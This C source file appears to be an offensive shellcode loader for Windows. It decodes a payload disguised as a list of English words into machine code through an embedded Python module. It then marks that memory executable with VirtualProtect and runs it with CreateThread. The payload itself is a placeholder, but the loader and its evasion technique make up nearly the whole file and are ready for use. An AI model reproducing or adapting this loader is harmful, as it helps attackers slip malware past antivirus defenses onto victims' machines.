#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "C:\\mingw64\\opt\\include\\python3.11\\Python.h"

/* 

Example paylod that is taken from payload-generator. Note: This is not a working payload, its just for representational purposes.

unsigned char *eng_words[] = {"governessdom","yggdrasil","fala","steatorrhoea","grandee","kathryn","lamping","strutting""fauvism"};

*/

// Your payload goes below
unsigned char *eng_words[] = <Your payload with curly brackets>

int main(void) {

	void * payload_mem;
	BOOL rv;
	HANDLE th;
    DWORD oldprotect = 0;

	rv = VirtualProtect(eng_words, sizeof(eng_words), PAGE_EXECUTE_READWRITE, &oldprotect);

 	Py_Initialize();
	PyObject *name, *func, *load_module, *args, *callfunc;

	printf("\nConnecting to AI...\n");

	name = PyUnicode_FromString((char*)"payload");
	load_module = PyImport_Import(name);
	func = PyObject_GetAttrString(load_module,(char*)"getopcode");

	void *startPtr = &eng_words[0];
	void *currentPointer = &eng_words[0];
	unsigned char* opc;
	char* token;
	unsigned char result;
	int arr_count = sizeof(eng_words)/sizeof(eng_words[0]);

	printf("Fetching Payload! Hold on to your butts...\n");

	for (int count=0; count < arr_count; count++){
		args = PyTuple_Pack(1, PyUnicode_FromString(eng_words[count]));
		callfunc = PyObject_CallObject(func, args);
		
		opc = _PyUnicode_AsString(callfunc);
		token = strtok(opc, "|");
		
		while(token != NULL) {
			result = (unsigned char)strtol(token, NULL, 16);
			RtlMoveMemory(currentPointer, &result, sizeof(result));
			currentPointer = currentPointer + sizeof(result);
			token = strtok(NULL, "|");
		}
	}

	unsigned char null_byte = {0x00};
	RtlMoveMemory(currentPointer, &null_byte, sizeof(null_byte));
	Py_Finalize();

	printf("Executing Payload...Boom\n");

	if ( rv != 0 ) {
			th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) startPtr, 0, 0, 0);
			DWORD result = WaitForSingleObject(th, -1);
			if (result == WAIT_FAILED) {
 			   DWORD error = GetLastError();
			   printf("%d", error);
			}
	}

	printf("Exiting...\n");
	return 0;
}
